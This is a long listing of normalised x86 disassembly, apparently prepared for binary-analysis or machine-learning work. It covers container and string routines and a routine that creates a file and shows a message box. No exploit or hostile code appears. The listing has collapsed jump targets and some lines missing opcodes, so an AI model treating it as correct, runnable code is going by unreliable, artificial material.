mov eax [ ebx + 0x8 ]
push 0x0
push eax
push esi
call sub_421220
mov eax [ rw-data ]
mov ecx [ esp + 0x38 ]
add esp 0x18
lea edx [ esp + 0x28 ]
push edx
push esi
push 0x102b
mov ebx 0x3
push eax
mov [ esp + 0x48 ] ebx
mov [ esp + 0x44 ] ecx
call ebp
mov eax [ rw-data ]
mov ecx [ esp + 0x24 ]
lea edx [ esp + 0x50 ]
push edx
push edi
push 0x102b
push eax
mov [ esp + 0x70 ] ebx
mov [ esp + 0x6c ] ecx
call ebp
sub_421a30
push ebp
mov ebp esp
push 0xffffffff
push sub_4bfb90
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
mov eax [ ebp + 0x10 ]
push ebx
push esi
mov esi ecx
mov ecx [ eax ]
push edi
mov edi [ esi + 0x4 ]
test edi edi
mov [ ebp - 0x10 ] esp
mov [ ebp + 0x10 ] ecx
jne r-xdata
mov eax [ esi + 0xc ]
sub eax edi
sar eax 0x2
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0xc
test edi edi
jne r-xdata
mov edx [ ebp + 0xc ]
test edx edx
je r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edi
sar ecx 0x2
xor ecx ecx
jmp r-xdata
test edi edi
jne r-xdata
mov ecx esi
call sub_4210a0
mov ebx 0x3fffffff
sub ebx ecx
cmp ebx edx
jae r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edi
sar ecx 0x2
xor ecx ecx
jmp r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ ebp + 0x8 ]
mov eax ebx
sub eax edi
sar eax 0x2
cmp eax edx
jae r-xdata
mov ecx eax
shr ecx 0x1
mov ebx 0x3fffffff
sub ebx ecx
cmp ebx eax
jae r-xdata
add ecx edx
cmp eax ecx
jae r-xdata
push ebx
push ecx
mov eax esp
mov [ eax ] ebx
mov [ ebp + 0xc ] esp
push ecx
shl edx 0x2
mov ecx esp
mov eax ebx
sub eax edx
mov [ ecx ] eax
mov [ ebp + 0xc ] esp
mov ecx esi
mov [ ebp + 0x8 ] edx
mov [ ebp + 0xc ] eax
call sub_448080
push ecx
mov [ esi + 0x8 ] eax
mov eax esp
mov [ ebp - 0x18 ] esp
push ecx
mov ecx [ ebp + 0xc ]
mov [ eax ] ebx
mov eax esp
mov [ ebp - 0x18 ] esp
push ecx
mov [ eax ] ecx
mov eax esp
lea edx [ ebp + 0xc ]
mov [ ebp + 0xc ] esp
push edx
mov [ eax ] edi
call sub_420d50
add esp 0x10
lea eax [ ebp + 0x10 ]
push eax
push ecx
mov ecx [ ebp + 0x8 ]
mov eax esp
add ecx edi
mov [ eax ] ecx
lea eax [ edx * 4 ]
mov [ ebp + 0x8 ] eax
add eax edi
push eax
push ecx
mov eax esp
mov [ ebp - 0x18 ] esp
push ecx
mov [ eax ] ebx
mov eax esp
mov ecx esi
mov [ ebp - 0x18 ] esp
mov [ eax ] edi
call sub_448080
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
lea edx [ ebp + 0x10 ]
push edx
mov edx ecx
sub edx edi
sar edx 0x2
sub eax edx
push eax
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_461a40
mov ebx [ esi + 0x8 ]
mov ecx [ ebp + 0x8 ]
add ebx ecx
lea eax [ ebp + 0x10 ]
mov [ esi + 0x8 ] ebx
push eax
mov esi ebx
push ecx
mov eax esp
sub esi ecx
mov [ eax ] esi
jmp r-xdata
add eax ecx
xor eax eax
jmp r-xdata
mov [ ebp + 0xc ] esp
push ecx
mov eax esp
mov [ eax ] edi
mov [ ebp + 0xc ] esp
call sub_4b2200
add esp 0xc
mov ecx [ esi + 0x8 ]
sub ecx edi
sar ecx 0x2
xor ecx ecx
jmp r-xdata
test edi edi
jne r-xdata
shl eax 0x2
push eax
mov [ ebp - 0x14 ] eax
call sub_4b573e
mov edx [ ebp + 0xc ]
add esp 0x4
push edx
mov edx [ ebp + 0x8 ]
mov ebx eax
mov eax [ esi + 0x4 ]
push esi
push ebx
push ecx
mov ecx esp
mov [ ecx ] edx
push ecx
mov ecx esp
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x4 ] 0x0
mov [ ecx ] eax
call sub_453050
mov edx [ ebp + 0xc ]
add esp 0x14
mov edi eax
mov eax [ ebp + 0xc ]
push eax
push esi
lea ecx [ ebp + 0x10 ]
push ecx
push edx
push edi
call sub_420d80
mov edx [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
add esp 0x14
push edx
lea eax [ edi + eax * 4 ]
push esi
push eax
push ecx
mov eax esp
mov [ eax ] ecx
push ecx
mov ecx [ ebp + 0x8 ]
mov eax esp
mov [ eax ] ecx
call sub_453050
mov ecx [ esi + 0x4 ]
add esp 0x14
test ecx ecx
jne r-xdata
test edi edi
jne r-xdata
add ecx edx
cmp eax ecx
jae r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov eax [ esi + 0x8 ]
sub eax edi
sar eax 0x2
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x14 ]
add edx ebx
lea eax [ ebx + edi * 4 ]
mov [ esi + 0xc ] edx
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov edi [ ebp + 0xc ]
add edi eax
test ecx ecx
je r-xdata
add eax edx
sub_421cd0
push esi
mov esi [ ecx + 0x4 ]
test esi esi
push edi
jne r-xdata
mov eax [ ecx + 0x8 ]
sub eax esi
sar eax 0x2
xor eax eax
jmp r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov edx [ esp + 0xc ]
cmp eax edx
jae r-xdata
pop edi
pop esi
retn 0x8
mov edi [ ecx + 0x8 ]
mov eax edi
sub eax esi
sar eax 0x2
cmp edx eax
jae r-xdata
mov eax [ ecx + 0x8 ]
sub eax esi
sar eax 0x2
xor eax eax
jmp r-xdata
push ecx
mov eax esp
mov [ eax ] edi
mov eax [ ecx + 0x4 ]
push ecx
lea eax [ eax + edx * 4 ]
mov esi esp
lea edx [ esp + 0x14 ]
push edx
mov [ esi ] eax
call sub_420e40
sub edx eax
lea esi [ esp + 0x10 ]
push esi
push edx
mov edx [ ecx + 0x8 ]
push ecx
mov eax esp
mov [ eax ] edx
call sub_421a30
pop edi
pop esi
retn 0x8
sub_421d50
mov edx [ esp + 0xc ]
push ebx
mov ebx [ esp + 0xc ]
cmp ebx edx
push esi
push edi
mov esi ecx
je r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop esi
mov [ eax ] ebx
pop ebx
retn 0xc
mov ecx [ esp + 0x10 ]
mov eax [ esi + 0x8 ]
push ecx
push ebx
push ecx
mov ecx esp
mov [ ecx ] eax
push ecx
mov eax esp
mov [ eax ] edx
call sub_420f20
mov edx [ esp + 0x20 ]
push edx
mov edi eax
mov eax [ esi + 0x8 ]
push esi
push eax
push edi
call sub_402270
add esp 0x20
mov [ esi + 0x8 ] edi
sub_421da0
push esi
mov esi ecx
mov edx [ esi + 0x4 ]
test edx edx
push edi
jne r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edx
sar ecx 0x2
xor ecx ecx
jmp r-xdata
mov edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
push edx
push 0x1
push ecx
mov ecx esp
mov [ ecx ] eax
mov ecx esi
call sub_421a30
pop edi
pop esi
retn 0x4
mov eax [ esi + 0xc ]
sub eax edx
sar eax 0x2
cmp ecx eax
jae r-xdata
test edx edx
je r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0xc ]
mov edi [ esi + 0x8 ]
push eax
push esi
push ecx
push 0x1
push edi
call sub_420d80
add esp 0x14
add edi 0x4
mov [ esi + 0x8 ] edi
pop edi
pop esi
retn 0x4
sub_421e10
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4bfba8
push eax
mov [ fs : 0x0 ] esp
push ebx
push ebp
push esi
push edi
mov ebx [ ecx + 0x4 ]
test ebx ebx
mov [ esp + 0x18 ] 0x0
jne r-xdata
mov esi [ ecx + 0x8 ]
sub esi ebx
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
mov edi [ esp + 0x20 ]
cmp edx edi
jae r-xdata
cmp [ esp + 0x3c ] 0x10
jb r-xdata
mov ebp [ ecx + 0x8 ]
mov esi ebp
sub esi ebx
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov eax edx
shr eax 0x1f
add edx eax
cmp edi edx
jae r-xdata
mov esi [ ecx + 0x8 ]
sub esi ebx
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov ecx [ esp + 0x10 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0xc
retn 0x20
mov eax [ esp + 0x28 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
imul edi edi 0x1c
push ecx
mov eax esp
mov [ esp + 0x24 ] esp
mov [ eax ] ebp
mov eax [ ecx + 0x4 ]
push ecx
mov edx esp
add edi eax
mov [ edx ] edi
lea edx [ esp + 0x28 ]
mov [ esp + 0x28 ] esp
push edx
call sub_421d50
lea eax [ esp + 0x24 ]
push eax
sub edi edx
mov edx [ ecx + 0x8 ]
push edi
push ecx
mov eax esp
mov [ esp + 0x2c ] esp
mov [ eax ] edx
call sub_403bf0
jmp r-xdata
sub_421f10
push ecx
sub esp 0x1c
mov eax esp
xor edx edx
mov [ eax + 0x18 ] 0xf
mov [ eax + 0x14 ] edx
mov [ eax + 0x4 ] dl
mov eax [ esp + 0x24 ]
mov [ esp + 0x1c ] esp
push eax
call sub_421e10
pop ecx
retn 0x4
sub_421f40
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_4bfbcb
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x540
mov ecx [ r--data ]
mov eax [ r--data ]
mov edx [ r--data ]
mov [ esp + 0x24 ] eax
mov eax [ r--data ]
mov [ esp + 0x28 ] ecx
mov cl [ r--data ]
mov [ esp + 0x30 ] eax
mov [ esp + 0x34 ] cl
xor eax eax
mov [ esp + 0x2c ] edx
mov edx [ r--data ]
push ebx
push esi
push edi
mov ecx 0x3c
lea edi [ esp + 0x41 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov eax [ r--data ]
mov ecx [ r--data ]
mov [ esp + 0x138 ] eax
mov al [ r--data ]
mov [ esp + 0x142 ] al
mov [ esp + 0x13c ] ecx
mov [ esp + 0x134 ] edx
mov dx [ r--data ]
xor eax eax
mov [ esp + 0x140 ] dx
mov edx [ r--data ]
mov ecx 0x3d
lea edi [ esp + 0x143 ]
[ edi ]
mov ecx [ r--data ]
stosb [ edi ]
mov al [ r--data ]
mov [ esp + 0x240 ] al
mov [ esp + 0x238 ] ecx
xor eax eax
mov [ esp + 0x23c ] edx
mov edx [ r--data ]
mov esi [ ebp + 0x8 ]
mov ecx 0x3e
lea edi [ esp + 0x241 ]
[ edi ]
mov ecx [ r--data ]
stosw [ edi ]
stosb [ edi ]
mov al [ r--data ]
mov [ esp + 0x344 ] al
mov [ esp + 0x33c ] ecx
xor eax eax
mov [ esp + 0x340 ] edx
mov ecx 0x3e
lea edi [ esp + 0x345 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov edi esi
shl edi 0x4
mov eax [ edi + rw-data ]
test eax eax
lea ebx [ edi + rw-data ]
je r-xdata
push rw-data
call sub_457f40
add esp 0x4
inc eax
push eax
push rw-data
lea edx [ esp + 0x448 ]
push edx
call [ lstrcpynA@IAT ]
imul esi esi 0x104
lea eax [ esp + esi + 0x30 ]
push eax
lea ecx [ esp + 0x444 ]
push ecx
call [ lstrcatA@IAT ]
xor esi esi
lea eax [ esp + 0x440 ]
mov [ esp + 0x28 ] 0xf
mov [ esp + 0x24 ] esi
mov [ esp + 0x14 ] 0x0
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov ecx [ ebx + 0x8 ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add edx ecx
mov [ esp + 0x2c ] edx
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea edx [ esp + 0x444 ]
push edx
lea ecx [ esp + 0x18 ]
call sub_401e80
lea eax [ esp + 0x10 ]
push eax
mov ecx ebx
mov [ esp + 0x558 ] esi
call sub_407460
mov eax [ esp + 0x28 ]
mov esi 0x10
cmp eax esi
jb r-xdata
mov eax [ esi * 4 + rw-data ]
mov edx [ edi + rw-data ]
imul eax eax 0x1c
mov ecx [ eax + edx + 0x18 ]
add eax edx
cmp ecx 0x10
jb r-xdata
mov edi [ edi + rw-data ]
cmp [ edi + 0x18 ] esi
jb r-xdata
mov ecx [ esp + 0x14 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ esp + 0x54c ]
pop edi
pop esi
add eax 0x4
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ eax + 0x4 ]
mov ecx [ esp + 0x54c ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ edi + 0x4 ]
mov ecx [ esp + 0x54c ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ edi + 0x4 ]
mov ecx [ esp + 0x54c ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4221d0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4bfc0f
push eax
mov eax 0x10054
mov [ fs : 0x0 ] esp
call sub_4b6180
push ebx
push edi
mov edi [ esp + 0x1006c ]
xor ebx ebx
cmp edi 0x2
jne r-xdata
push ebp
push esi
push edi
call sub_421f40
add esp 0x4
lea ecx [ esp + 0x3c ]
mov esi eax
call sub_44fb50
mov eax edi
shl eax 0x4
lea edi [ eax + rw-data ]
mov [ esp + 0x18 ] eax
mov eax [ edi + 0x4 ]
cmp eax ebx
mov [ esp + 0x1006c ] ebx
je r-xdata
cmp [ rw-data ] ebx
jne r-xdata
mov al [ esp + 0x10078 ]
test al al
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] ebx
jne r-xdata
push eax
call j_sub_4b66ed#2
add esp 0x4
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
mov ebp [ esp + 0x10074 ]
mov ebx [ esp + 0x18 ]
shl ebp 0x7
mov [ esp + 0x10 ] 0x0
add ebp rw-data
mov ebp 0xf
mov eax esi
mov [ esp + 0x38 ] ebp
mov [ esp + 0x34 ] 0x0
mov [ esp + 0x24 ] 0x0
lea edx [ eax + 0x1 ]
pop edi
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov eax 0x1
pop ebx
mov ecx [ esp + 0x10054 ]
mov [ fs : 0x0 ] ecx
add esp 0x10060
retn
push eax
call j_sub_4b66ed#2
add esp 0x4
mov eax [ esp + 0x10 ]
inc eax
add ebp 0x4
cmp eax 0x20
mov [ esp + 0x10 ] eax
jl r-xdata
mov ecx [ ebx + rw-data ]
test ecx ecx
lea edi [ ebx + rw-data ]
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push esi
lea ecx [ esp + 0x28 ]
call sub_401e80
lea eax [ esp + 0x20 ]
push eax
lea ecx [ esp + 0x40 ]
mov [ esp + 0x10070 ] 0x1
call sub_450170
test eax eax
mov eax [ esp + 0x38 ]
mov edi 0x10
setne bl
cmp eax edi
mov [ esp + 0x1006c ] 0x0
jb r-xdata
mov esi [ ebp ]
test esi esi
jl r-xdata
mov edx [ esp + 0x10074 ]
mov [ edx + rw-data ] 0x1
mov eax [ edi + 0x8 ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
test bl bl
je r-xdata
mov ecx [ esp + 0x24 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov eax [ ebx + rw-data ]
mov ecx [ esp + 0x10 ]
mov [ eax + esi * 4 ] ecx
push 0x0
lea edx [ esi + 0x1 ]
push edx
mov ecx edi
call sub_41d110
mov ecx [ edi + 0x4 ]
test ecx ecx
jne r-xdata
cmp esi eax
jl r-xdata
lea ecx [ esp + 0x3c ]
call sub_450340
sub eax 0x3
je r-xdata
mov ecx [ esp + 0x18 ]
lea ecx [ ecx + rw-data ]
call sub_403ab0
mov eax [ esp + 0x10074 ]
xor esi esi
push eax
mov [ eax * 4 + rw-data ] esi
call sub_421f40
mov ecx eax
mov [ esp + 0x38 ] esi
add esp 0x4
mov [ esp + 0x38 ] ebp
mov [ esp + 0x24 ] 0x0
lea esi [ ecx + 0x1 ]
lea esp [ esp ]
mov eax [ edi + 0x8 ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
lea ecx [ esp + 0x3c ]
call sub_44fb20
dec eax
je r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx esi
push ecx
push eax
lea ecx [ esp + 0x28 ]
call sub_401e80
lea edx [ esp + 0x20 ]
push edx
lea ecx [ esp + 0x40 ]
mov [ esp + 0x10070 ] 0x2
call sub_450170
test eax eax
mov eax [ esp + 0x38 ]
setne bl
cmp eax edi
mov [ esp + 0x1006c ] 0x0
jb r-xdata
lea esp [ esp ]
cmp eax esi
jge r-xdata
lea ecx [ esp + 0x3c ]
call sub_450280
test eax eax
jne r-xdata
mov [ esi * 4 + rw-data ] 0x1
lea ecx [ esp + 0x3c ]
call sub_44fb30
call sub_4b64c4
jmp r-xdata
dec eax
je r-xdata
test bl bl
jne r-xdata
mov eax [ esp + 0x24 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ ebx + rw-data ]
mov [ ecx + eax * 4 ] 0xffffffff
inc eax
cmp eax esi
jl r-xdata
mov ecx [ esp + 0x40 ]
mov edi [ esp + 0x18 ]
mov ebx esi
xor ebp ebp
shl ebx 0x7
lea edx [ ebx + rw-data ]
mov [ esp + 0x1c ] ecx
mov [ esp + 0x14 ] ebx
mov [ esp + 0x10 ] edx
lea ecx [ esp + 0x3c ]
call sub_450280
cmp eax 0x1
je r-xdata
test eax eax
mov esi [ esp + 0x10074 ]
mov [ esi * 4 + rw-data ] eax
jg r-xdata
lea ecx [ esp + 0x3c ]
call sub_44fb40
movzx eax al
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ esp + 0x10 ]
mov [ eax ] esi
inc ebp
add eax 0x4
cmp ebp 0x20
mov [ esp + 0x10 ] eax
jl r-xdata
mov ecx [ edi + rw-data ]
test ecx ecx
lea ebx [ edi + rw-data ]
jne r-xdata
lea ecx [ esp + 0x3c ]
mov [ esp + 0x1006c ] 0xffffffff
call sub_44f5f0
xor eax eax
mov eax [ esp + 0x1c ]
push 0xffffffff
push eax
lea ecx [ esp + 0x44 ]
call sub_420600
mov esi eax
test esi esi
jl r-xdata
lea ecx [ esp + 0x3c ]
call sub_450280
test eax eax
jne r-xdata
mov eax [ ebx + 0x8 ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov ebp [ esp + 0x40 ]
lea edi [ ebx + rw-data ]
mov ebx 0x20
lea ecx [ esp + 0x3c ]
call sub_450280
cmp eax 0x1
je r-xdata
mov eax [ edi + rw-data ]
mov ebx [ esp + 0x14 ]
mov [ eax + esi * 4 ] ebp
push 0x0
lea ecx [ esi + 0x1 ]
push ecx
mov ecx ebx
call sub_41d110
mov ecx [ ebx + 0x4 ]
test ecx ecx
jne r-xdata
cmp esi eax
jl r-xdata
add edi 0x4
dec ebx
jne r-xdata
lea ecx [ esp + 0x3c ]
call sub_450340
mov eax esi
sub eax 0x3
je r-xdata
mov eax [ ebx + 0x8 ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
lea ecx [ esp + 0x3c ]
call sub_450280
mov esi eax
cmp [ esp + 0x40 ] ebp
jne r-xdata
lea ecx [ esp + 0x3c ]
call sub_450340
sub eax 0x3
je r-xdata
lea ecx [ esp + 0x3c ]
call sub_44fb20
dec eax
je r-xdata
lea ebx [ ebx ]
cmp eax esi
jge r-xdata
lea ecx [ esp + 0x3c ]
call sub_44fb20
dec eax
je r-xdata
mov [ edi ] eax
lea ecx [ esp + 0x3c ]
call sub_44fb30
call sub_4b64c4
jmp r-xdata
dec eax
jne r-xdata
mov ecx [ edi + rw-data ]
mov [ ecx + eax * 4 ] 0xffffffff
inc eax
cmp eax esi
jl r-xdata
mov ebx [ esp + 0x40 ]
mov edi [ ebp * 4 + rw-data ]
lea ecx [ esp + 0x3c ]
call sub_450280
mov esi eax
cmp [ esp + 0x40 ] ebx
je r-xdata
lea ecx [ esp + 0x3c ]
call sub_450280
cmp eax 0x1
je r-xdata
lea ecx [ esp + 0x3c ]
call sub_44fb30
call sub_4b64c4
jmp r-xdata
dec eax
je r-xdata
test eax eax
jl r-xdata
lea ecx [ esp + 0x3c ]
call sub_44fb40
movzx eax al
jmp r-xdata
lea ecx [ esp + 0x3c ]
call sub_450340
mov eax esi
sub eax 0x3
je r-xdata
mov eax edi
jmp r-xdata
mov ebp [ esp + 0x10074 ]
lea ecx [ esp + 0x3c ]
mov [ ebp * 4 + rw-data ] eax
call sub_450280
test eax eax
jne r-xdata
lea ecx [ esp + 0x3c ]
call sub_44fb40
movzx eax al
jmp r-xdata
xor eax eax
jmp r-xdata
lea ecx [ esp + 0x3c ]
call sub_44fb20
dec eax
je r-xdata
mov edi [ ebp * 4 + rw-data ]
lea ecx [ esp + 0x3c ]
mov [ ebp * 4 + rw-data ] eax
call sub_450280
mov esi eax
cmp [ esp + 0x40 ] ebx
je r-xdata
lea ecx [ esp + 0x3c ]
call sub_450340
sub esi 0x3
je r-xdata
mov eax edi
jmp r-xdata
lea ecx [ esp + 0x3c ]
call sub_44fb30
call sub_4b64c4
jmp r-xdata
dec eax
je r-xdata
lea ecx [ esp + 0x3c ]
call sub_44fb20
dec esi
je r-xdata
mov ecx [ ebp * 4 + rw-data ]
cmp ecx eax
mov [ ebp * 4 + rw-data ] eax
jne r-xdata
lea ecx [ esp + 0x3c ]
call sub_44fb40
movzx eax al
jmp r-xdata
mov eax edi
jmp r-xdata
mov edi [ ebp * 4 + rw-data ]
lea ecx [ esp + 0x3c ]
call sub_450280
mov esi eax
cmp [ esp + 0x40 ] ebx
je r-xdata
not ecx
mov [ ebp * 4 + rw-data ] ecx
lea ecx [ esp + 0x3c ]
call sub_44fb30
call sub_4b64c4
jmp r-xdata
dec esi
je r-xdata
lea ecx [ esp + 0x3c ]
call sub_450340
mov eax esi
sub eax 0x3
je r-xdata
mov eax edi
jmp r-xdata
lea ecx [ esp + 0x3c ]
call sub_44fb40
movzx eax al
jmp r-xdata
mov eax edi
jmp r-xdata
lea ecx [ esp + 0x3c ]
call sub_44fb20
dec eax
je r-xdata
mov edi [ ebp * 4 + rw-data ]
lea ecx [ esp + 0x3c ]
mov [ ebp * 4 + rw-data ] eax
call sub_450280
mov esi eax
cmp [ esp + 0x40 ] ebx
je r-xdata
lea ecx [ esp + 0x3c ]
call sub_450340
sub esi 0x3
je r-xdata
mov eax edi
jmp r-xdata
lea ecx [ esp + 0x3c ]
call sub_44fb30
call sub_4b64c4
jmp r-xdata
dec eax
je r-xdata
lea ecx [ esp + 0x3c ]
call sub_44fb20
dec esi
je r-xdata
mov ecx [ ebp * 4 + rw-data ]
cmp ecx eax
mov [ ebp * 4 + rw-data ] eax
jne r-xdata
lea ecx [ esp + 0x3c ]
call sub_44fb40
movzx eax al
jmp r-xdata
mov eax edi
jmp r-xdata
mov edi [ ebp * 4 + rw-data ]
lea ecx [ esp + 0x3c ]
call sub_450280
mov esi eax
cmp [ esp + 0x40 ] ebx
je r-xdata
not ecx
mov [ ebp * 4 + rw-data ] ecx
lea ecx [ esp + 0x3c ]
call sub_44fb30
call sub_4b64c4
jmp r-xdata
dec esi
je r-xdata
lea ecx [ esp + 0x3c ]
call sub_450340
mov eax esi
sub eax 0x3
je r-xdata
mov eax edi
jmp r-xdata
lea ecx [ esp + 0x3c ]
call sub_44fb40
movzx eax al
jmp r-xdata
mov eax edi
jmp r-xdata
lea ecx [ esp + 0x3c ]
call sub_44fb20
dec eax
je r-xdata
lea ecx [ esp + 0x3c ]
mov [ ebp * 4 + rw-data ] eax
call sub_450280
test eax eax
je r-xdata
mov ecx [ esp + 0x10074 ]
mov [ ecx + rw-data ] 0x1
lea ecx [ esp + 0x3c ]
mov [ esp + 0x1006c ] 0xffffffff
call sub_44f5f0
mov eax 0x1
jmp r-xdata
lea ecx [ esp + 0x3c ]
call sub_450280
cmp eax 0x1
je r-xdata
lea ecx [ esp + 0x3c ]
call sub_44fb30
call sub_4b64c4
jmp r-xdata
dec eax
je r-xdata
mov ecx [ esp + 0x10064 ]
pop esi
pop ebp
pop edi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10060
retn
mov edx [ esp + 0x40 ]
push 0x384
mov [ esp + 0x14 ] edx
call sub_4b573e
mov esi eax
add esp 0x4
mov [ esp + 0x14 ] esi
test esi esi
mov [ esp + 0x1006c ] 0x3
je r-xdata
lea ecx [ esp + 0x3c ]
call sub_44fb40
movzx eax al
jmp r-xdata
mov eax edi
jmp r-xdata
xor ebp ebp
push sub_4480e0
push sub_401360
push 0x20
push 0x1c
push esi
call sub_4b6874
mov ebp esi
jmp r-xdata
call sub_450280
mov ecx [ esp + 0x10 ]
mov edi eax
cmp [ esp + 0x40 ] ecx
je r-xdata
call sub_450280
mov ecx [ esp + 0x40 ]
mov edi eax
mov eax [ esp + 0x10 ]
cmp ecx eax
je r-xdata
mov [ esp + 0x1006c ] 0x0
mov [ esp + 0x14 ] ebp
lea ebx [ ebp + 0x1c ]
mov esi rw-data
mov edi edi
lea ecx [ esp + 0x3c ]
call sub_450340
mov eax edi
sub eax 0x3
je r-xdata
or eax 0xffffffff
jmp r-xdata
lea ecx [ esp + 0x3c ]
call sub_450340
mov eax edi
sub eax 0x2
je r-xdata
mov eax r--data
jmp r-xdata
lea ecx [ esp + 0x3c ]
call sub_44fb20
dec eax
je r-xdata
push eax
mov ecx ebx
call sub_421150
lea ecx [ esp + 0x3c ]
call sub_44fb10
sub eax 0x1c
je r-xdata
mov ecx eax
lea edi [ ecx + 0x1 ]
lea ecx [ ecx ]
cmp [ esi ] 0x73
lea ecx [ esp + 0x3c ]
jne r-xdata
mov eax [ esp + 0x10074 ]
lea esi [ eax + eax * 2 ]
mov [ ebp + 0x380 ] eax
mov edi [ esi * 4 + rw-data ]
mov eax [ edi + 0x4 ]
lea esi [ esi * 4 + rw-data ]
lea edx [ esp + 0x14 ]
push edx
push eax
push edi
mov ecx esi
call sub_420cf0
push 0x1
mov ecx esi
mov ebp eax
call sub_420ff0
mov [ edi + 0x4 ] ebp
mov eax [ ebp + 0x4 ]
lea ecx [ esp + 0x3c ]
mov [ eax ] ebp
call sub_450280
test eax eax
jne r-xdata
lea ecx [ esp + 0x3c ]
call sub_44fb30
call sub_4b64c4
jmp r-xdata
dec eax
je r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx edi
push ecx
push eax
mov ecx ebx
call sub_401e80
jmp r-xdata
mov eax r--data
jmp r-xdata
lea ecx [ esp + 0x3c ]
call sub_44fb40
movzx eax al
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
add esi 0x4
add ebx 0x1c
cmp esi rw-data
jl r-xdata
sub_422a90
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4bfc2b
push eax
mov eax [ rw-data ]
mov [ fs : 0x0 ] esp
sub esp 0x294
push ebx
mov ebx [ esp + 0x2a8 ]
push ebp
and eax 0x7
cmp ebx eax
push esi
push edi
jne r-xdata
push ebx
call sub_421f40
mov edi [ CreateFileA@IAT ]
add esp 0x4
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
mov esi eax
push 0x40000000
push esi
call edi
cmp eax 0xffffffff
mov [ esp + 0x30 ] eax
jne r-xdata
call sub_420a10
xor edi edi
mov [ esp + 0x2c ] 0xf
mov [ esp + 0x28 ] edi
mov [ esp + 0x18 ] 0x0
mov edx [ ebx * 4 + rw-data ]
push edx
lea eax [ esp + 0x40 ]
push r--data
push eax
mov [ esp + 0x2b8 ] edi
call [ wsprintfA@IAT ]
lea eax [ esp + 0x48 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov ebp [ MessageBoxA@IAT ]
lea esp [ esp ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ esp + 0x40 ]
push ecx
lea ecx [ esp + 0x1c ]
call sub_401cc0
xor ebp ebp
shl ebx 0x7
mov [ esp + 0x10 ] ebx
lea ebx [ ebx + rw-data ]
xor eax eax
jmp r-xdata
push esi
lea ecx [ esp + 0x140 ]
push r--data
push ecx
call [ wsprintfA@IAT ]
add esp 0xc
push 0x35
push r--data
lea edx [ esp + 0x144 ]
push edx
push 0x0
call ebp
cmp eax 0x2
je r-xdata
inc ebp
add ebx 0x4
cmp ebp 0x20
jl r-xdata
cmp edi ebp
jge r-xdata
